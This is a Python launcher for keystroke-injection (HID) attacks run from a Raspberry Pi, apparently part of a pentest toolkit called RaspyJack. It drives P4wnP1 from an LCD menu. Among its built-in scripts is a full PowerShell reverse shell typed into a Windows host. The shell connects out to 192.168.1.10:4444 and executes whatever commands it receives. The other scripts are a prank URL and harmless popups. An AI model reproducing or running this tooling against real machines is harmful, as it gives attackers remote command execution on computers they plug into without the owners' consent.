#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack Launcher**
=============================================
This script executes pre-defined HID attacks (keyboard emulation) using the
underlying P4wnP1 A.L.O.A. system.

It demonstrates how to:
1. Create a menu of different HID attack scripts.
2. Use the 'P4wnP1_cli' utility to run the attacks.
3. Display the status of the attack on the LCD.
4. Exit cleanly on KEY3 press.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# ---------------------------------------------------------------------------
# 3) HID Attack Scripts (P4wnP1 DuckyScript format)
# ---------------------------------------------------------------------------
# Note: These are formatted for a US keyboard layout by default.
HID_SCRIPTS = {
    "Test: Hello World": [
        'GUI r', 'delay(500)',
        'type("notepad")', 'press("ENTER")', 'delay(1000)',
        'type("Hello from RaspyJack!")'
    ],
    "Prank: Rickroll": [
        'GUI r', 'delay(500)',
        'type("https://www.youtube.com/watch?v=dQw4w9WgXcQ")', 'press("ENTER")'
    ],
    "Demo: Revshell (Win)": [
        'GUI r', 'delay(500)',
        'type("powershell")', 'press("ENTER")', 'delay(1000)',
        'type("powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient(\'192.168.1.10\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"')",
        'press("ENTER")'
    ],
    "Demo: macOS Popup": [
        'GUI SPACE', 'delay(500)',
        'type("Terminal")', 'press("ENTER")', 'delay(1000)',
        'type(\'osascript -e \\'display dialog "Hello from RaspyJack!" with icon 1 buttons {"OK"} default button "OK"\\'\')',
        'press("ENTER")'
    ]
}
SCRIPT_NAMES = list(HID_SCRIPTS.keys())

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
running = True

def cleanup(*_):
    """Signal handler to stop the main loop."""
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) Core Attack Function
# ---------------------------------------------------------------------------

def run_hid_attack(script_name: str):
    """Executes a HID script using P4wnP1_cli."""
    script_lines = HID_SCRIPTS.get(script_name)
    if not script_lines:
        return False

    # The script is a list of commands. We join them with semicolons.
    full_script = '; '.join(script_lines)
    
    # The P4wnP1_cli expects the script to be quoted.
    command = f"P4wnP1_cli hid job -c '{full_script}'"
    
    try:
        subprocess.run(command, shell=True, check=True, timeout=60)
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError) as e:
        print(f"Error running HID attack: {e}", file=sys.stderr)
        return False

# ---------------------------------------------------------------------------
# 6) UI and Drawing Functions
# ---------------------------------------------------------------------------

def draw_menu(selected_index: int):
    """Draws the attack selection menu."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    
    d.text((5, 5), "HID Attack Launcher", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    start_index = max(0, selected_index - 2)
    end_index = min(len(SCRIPT_NAMES), start_index + 6)
    
    y_pos = 30
    for i in range(start_index, end_index):
        line = SCRIPT_NAMES[i]
        fill = "yellow" if i == selected_index else "white"
        d.text((5, y_pos), line, font=FONT, fill=fill)
        y_pos += 15

    d.text((5, 110), "OK=Run | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_status(message: str, color: str = "yellow"):
    """Draws a status message on the screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    selected_index = 0
    
    # Check for P4wnP1_cli
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        draw_status("P4wnP1_cli not found!", "red")
        time.sleep(5)
        raise SystemExit("P4wnP1_cli not found")

    while running:
        draw_menu(selected_index)
        
        button_pressed = False
        while not button_pressed and running:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["UP"]) == 0:
                selected_index = (selected_index - 1) % len(SCRIPT_NAMES)
                button_pressed = True
            elif GPIO.input(PINS["DOWN"]) == 0:
                selected_index = (selected_index + 1) % len(SCRIPT_NAMES)
                button_pressed = True
            elif GPIO.input(PINS["OK"]) == 0:
                script_to_run = SCRIPT_NAMES[selected_index]
                draw_status(f"Running:\n{script_to_run}")
                
                if run_hid_attack(script_to_run):
                    draw_status("Attack finished!", "lime")
                else:
                    draw_status("Attack failed!", "red")
                
                time.sleep(2)
                button_pressed = True

            time.sleep(0.1)
        
        time.sleep(0.2) # Debounce

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
    draw_status(f"ERROR:\n{str(e)[:20]}", "red")
    time.sleep(3)
finally:
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("HID Attack payload finished.")
